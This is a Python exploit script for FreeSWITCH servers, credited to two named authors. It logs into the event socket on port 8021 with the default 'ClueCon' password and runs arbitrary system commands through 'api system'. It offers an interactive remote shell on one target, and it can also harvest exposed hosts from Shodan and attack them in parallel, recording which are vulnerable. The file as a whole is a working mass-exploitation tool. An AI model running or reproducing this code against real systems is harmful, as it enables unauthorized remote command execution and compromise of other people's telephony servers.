import os
import sys
import shodan
import shutil
import argparse
import concurrent.futures

from socket import *
from rich.table import Table
from rich.console import Console
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory

class FreeSwitchExploit:

    def __init__(self, args):
        self.console = Console()
        self.interactive = False
        self.args = args
        self.PASSWORD = 'ClueCon'
        self.TARGET_LIST_FILE = args.output if args.output else 'vulnerable.txt'
        self.CMD = 'echo "Balgo : VULNERABLE"' if args.auto else args.command
        self.SHODAN_API_KEY = os.environ.get('SHODAN_API_KEY')
        self.target_list = []

        

        if not self.SHODAN_API_KEY and self.args.auto:
            self.console.print("[bold red]Error: Shodan API key not found[/bold red]")
            self.console.print("To add the Shodan API key, export it as an environment variable:\n")
            self.console.print("export SHODAN_API_KEY=Your_Shodan_API_Key")
            sys.exit(1)

    def draw_border(self, char='#'):
        terminal_size = shutil.get_terminal_size().columns
        self.console.print(char * terminal_size)

    def interactive_shell(self, address):
        session = PromptSession(history=InMemoryHistory())
        self.interactive = True
        while True:
            try:
                cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
                self.CMD = cmd
                self.exploit_target(address)

            except KeyboardInterrupt:
                self.console.print("[bold][yellow][!] Exited shell[/bold][/yellow]")
                sys.exit(0)
        
            
    def exploit_target(self, address):
        try:
            s = socket(AF_INET, SOCK_STREAM)
            s.settimeout(5)
            s.connect((address, 8021))

            response = s.recv(1024)
            if b'auth/request' in response:
                s.send(bytes('auth {}\n\n'.format(self.PASSWORD), 'utf8'))
                response = s.recv(1024)
                if b'+OK accepted' in response:
                    self.console.print(f"[bold green]Authenticated - {address}[/bold green]") if not self.interactive else None
                    s.send(bytes('api system {}\n\n'.format(self.CMD), 'utf8'))
                    response = s.recv(8096).decode()
                    print(response)
                    balgo_line = next((line for line in response.split('\n') if 'Balgo' in line), None)
                    if balgo_line and not self.interactive:
                        self.console.print(f"[bold green]Command executed successfully - {address}[/bold green]")
                        self.console.print(balgo_line)
                        with open(self.TARGET_LIST_FILE, 'a') as file:
                            file.write(address + '\n') if self.args.auto else None
                        return (address, balgo_line)
                    else:
                        self.console.print(f"[bold red]Command execution failed - {address}[/bold red]") if self.args.auto else None
                        return None
                else:
                    self.console.print(f"[bold red]Authentication failed - {address}[/bold red]")
                    return address, "Authentication failed"
            else:
                self.console.print(f"[bold yellow]Not prompted for authentication, likely not vulnerable - {address}[/bold yellow]")
                return address, "Not vulnerable"
        except Exception as e:
            self.console.print(f"[bold red]Error: {e}[/bold red]")
            return address, f"Error: {e}"
        finally:
            s.close()

    def generate_targets(self):
        if self.args.auto:
            try:
                api = shodan.Shodan(self.SHODAN_API_KEY)
                results = api.search('port:8021 Content-Type: auth/request')
                self.target_list = [result['ip_str'] for result in results['matches']]
            except shodan.APIError as e:
                self.console.print(f"[bold red]Error: {e}[/bold red]")
                sys.exit(1)
        elif self.args.target:
            self.target_list = [self.args.target]
        else:
            self.console.print("[bold red]Please specify either a single target with --target or use --auto for multiple targets[/bold red]")
            sys.exit(1)

    def run(self):
        self.draw_border()
        self.console.print("[bold cyan]Exploit for FreeSWITCH by Chocapikk and TrHacknon[/bold cyan]", justify="center")
        self.draw_border()
        self.console.print("\n")

        if self.args.target:
            self.interactive_shell(self.args.target)
        
        self.generate_targets()

        table = Table(show_header=True, header_style="bold", title="Exploitation Results")
        table.add_column("Target", style="cyan")
        table.add_column("Result", style="magenta")

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self.exploit_target, address): address for address in self.target_list}
            for future in concurrent.futures.as_completed(futures):
                address = futures[future]
                try:
                    result = future.result()
                except Exception as e:
                    self.console.print(f"[bold red]Error: {e}[/bold red]")
                    continue

                if result:
                    table.add_row(*result)

        self.console.print(table) if self.args.auto else None

def main():
    parser = argparse.ArgumentParser(description='FreeSWITCH Exploit')
    parser.add_argument('--target', help='Specify a single target IP')
    parser.add_argument('--auto', action='store_true', help='Automatically generate a list of targets from Shodan')
    parser.add_argument('--output', help='Specify output file for vulnerable targets')

    if len(sys.argv)==1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    exploit = FreeSwitchExploit(args)
    exploit.run()

if __name__ == "__main__":
    main()
